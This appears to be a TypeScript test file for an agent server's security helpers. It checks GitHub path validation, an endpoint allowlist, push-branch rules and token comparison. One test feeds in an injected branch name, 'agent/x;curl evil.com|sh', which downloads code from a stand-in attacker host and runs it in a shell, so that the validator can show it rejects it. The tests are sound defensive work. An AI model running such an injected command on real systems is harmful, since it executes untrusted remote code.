/**
 * Tier 1 tests: agent-server pure validation helpers (task 84.3 / FR-5 / FR-6).
 *
 * These exercise the exported pure functions directly. Socket-level op tests
 * (cap-token auth, dispatch, AC-4/5/6/10/11) land with item 85.
 */
import { describe, it, expect } from 'vitest';
import {
  validateAndBuildUrl,
  isAllowedGithubForward,
  isValidPushBranch,
  extractRepoFromPath,
  bodyTargetsProtectedBase,
  prPatchBodyAllowed,
  capTokensEqual,
} from '../../src/agent-server.js';

describe('validateAndBuildUrl (raw path validation, FR-5.3)', () => {
  it('accepts a simple valid path', () => {
    const url = validateAndBuildUrl('/repos/o/r/pulls/1');
    expect(url).not.toBeNull();
    expect(url!.pathname).toBe('/repos/o/r/pulls/1');
  });

  it('rejects a path not starting with /', () => {
    expect(validateAndBuildUrl('repos/o/r')).toBeNull();
  });

  it('rejects encoded traversal %2e%2e in a non-ref segment (AC-6)', () => {
    expect(validateAndBuildUrl('/repos/o/r/pulls/%2e%2e')).toBeNull();
  });

  it('rejects a backslash path (AC-11)', () => {
    expect(validateAndBuildUrl('\\repos\\o\\r\\hooks')).toBeNull();
  });

  it('rejects an embedded %5c (encoded backslash) in a non-ref segment', () => {
    expect(validateAndBuildUrl('/repos/o/r/pulls/1%5c..')).toBeNull();
  });

  it('rejects a bare percent in a non-ref segment', () => {
    expect(validateAndBuildUrl('/repos/o/r/pulls/1%')).toBeNull();
  });

  it('rejects empty segments (double slash)', () => {
    expect(validateAndBuildUrl('/repos//r/pulls')).toBeNull();
  });

  it('rejects a path with a query string embedded', () => {
    expect(validateAndBuildUrl('/repos/o/r/pulls?state=open')).toBeNull();
  });

  it('allows slashes in a ref position (branch with slash)', () => {
    const url = validateAndBuildUrl('/repos/o/r/git/refs/heads/agent/fix');
    expect(url).not.toBeNull();
    expect(url!.pathname).toBe('/repos/o/r/git/refs/heads/agent/fix');
  });

  it('applies allowed query params structurally', () => {
    const url = validateAndBuildUrl('/repos/o/r/pulls', { state: 'open', per_page: '5' });
    expect(url).not.toBeNull();
    expect(url!.searchParams.get('state')).toBe('open');
    expect(url!.searchParams.get('per_page')).toBe('5');
  });

  it('rejects a disallowed query param', () => {
    expect(validateAndBuildUrl('/repos/o/r/pulls', { evil: '1' })).toBeNull();
  });
});

describe('isAllowedGithubForward (allowlist, FR-5.4)', () => {
  it('allows GET /repos/o/r/pulls/1 (AC-5)', () => {
    expect(isAllowedGithubForward('GET', '/repos/o/r/pulls/1')).toBe(true);
  });

  it('allows POST /repos/o/r/pulls', () => {
    expect(isAllowedGithubForward('POST', '/repos/o/r/pulls')).toBe(true);
  });

  it('allows PATCH /repos/o/r/pulls/1', () => {
    expect(isAllowedGithubForward('PATCH', '/repos/o/r/pulls/1')).toBe(true);
  });

  it('allows GET check-runs for a ref with slashes', () => {
    expect(isAllowedGithubForward('GET', '/repos/o/r/commits/abc123/check-runs')).toBe(true);
    expect(isAllowedGithubForward('GET', '/repos/o/r/git/refs/heads/agent/fix')).toBe(true);
  });

  it('denies POST /repos/o/r/hooks (AC-4)', () => {
    expect(isAllowedGithubForward('POST', '/repos/o/r/hooks')).toBe(false);
  });

  it('denies POST /repos/o/r/merges (direct merge)', () => {
    expect(isAllowedGithubForward('POST', '/repos/o/r/merges')).toBe(false);
  });

  it('denies PUT /repos/o/r/contents/x (direct file write)', () => {
    expect(isAllowedGithubForward('PUT', '/repos/o/r/contents/x')).toBe(false);
  });

  it('denies /graphql', () => {
    expect(isAllowedGithubForward('POST', '/graphql')).toBe(false);
  });

  it('denies DELETE on an otherwise-allowed path (method mismatch)', () => {
    expect(isAllowedGithubForward('DELETE', '/repos/o/r/pulls/1')).toBe(false);
  });

  it('denies a path not under /repos/', () => {
    expect(isAllowedGithubForward('GET', '/user')).toBe(false);
  });
});

describe('isValidPushBranch (FR-6.1 step 2)', () => {
  it('accepts a valid feature branch', () => {
    expect(isValidPushBranch('agent/fix')).toBe(true);
    expect(isValidPushBranch('feat/some-thing')).toBe(true);
    expect(isValidPushBranch('fix/a/b/c')).toBe(true);
  });

  it('rejects protected branches', () => {
    expect(isValidPushBranch('main')).toBe(false);
    expect(isValidPushBranch('master')).toBe(false);
    expect(isValidPushBranch('development')).toBe(false);
  });

  it('rejects a branch with a colon (refspec separator)', () => {
    expect(isValidPushBranch('agent/x:main')).toBe(false);
  });

  it('rejects a branch with shell metacharacters', () => {
    expect(isValidPushBranch('agent/x;curl evil.com|sh')).toBe(false);
  });

  it('rejects a branch with ..', () => {
    expect(isValidPushBranch('agent/..')).toBe(false);
  });

  it('rejects an unprefixed branch', () => {
    expect(isValidPushBranch('random-branch')).toBe(false);
  });
});

describe('extractRepoFromPath', () => {
  it('extracts owner/repo from a repos path', () => {
    expect(extractRepoFromPath('/repos/octo/widget/pulls/1')).toBe('octo/widget');
  });
  it('returns null for a non-repos path', () => {
    expect(extractRepoFromPath('/user')).toBeNull();
  });
});

describe('bodyTargetsProtectedBase (FR-5.3 step 6)', () => {
  it('flags base=main', () => {
    expect(bodyTargetsProtectedBase({ base: 'main' })).toBe(true);
    expect(bodyTargetsProtectedBase({ base: 'master' })).toBe(true);
  });
  it('allows base=development (intended PR target)', () => {
    expect(bodyTargetsProtectedBase({ base: 'development' })).toBe(false);
  });
  it('ignores non-object body', () => {
    expect(bodyTargetsProtectedBase(null)).toBe(false);
    expect(bodyTargetsProtectedBase('x')).toBe(false);
  });
});

describe('prPatchBodyAllowed (FR-5.4 PATCH pulls)', () => {
  it('allows title/body only', () => {
    expect(prPatchBodyAllowed({ title: 'fix' })).toBe(true);
    expect(prPatchBodyAllowed({ title: 'fix', body: 'desc' })).toBe(true);
  });
  it('rejects any other key (e.g. base)', () => {
    expect(prPatchBodyAllowed({ base: 'main' })).toBe(false);
    expect(prPatchBodyAllowed({ title: 'x', state: 'closed' })).toBe(false);
  });
});

describe('capTokensEqual (FR-4.4)', () => {
  it('accepts matching non-empty tokens', () => {
    expect(capTokensEqual('abc123', 'abc123')).toBe(true);
  });
  it('rejects mismatched tokens', () => {
    expect(capTokensEqual('abc123', 'abc124')).toBe(false);
  });
  it('rejects empty tokens on either side', () => {
    expect(capTokensEqual('', 'abc')).toBe(false);
    expect(capTokensEqual('abc', '')).toBe(false);
    expect(capTokensEqual('', '')).toBe(false);
  });
  it('rejects different-length tokens without throwing', () => {
    expect(capTokensEqual('abc', 'abcdef')).toBe(false);
  });
});
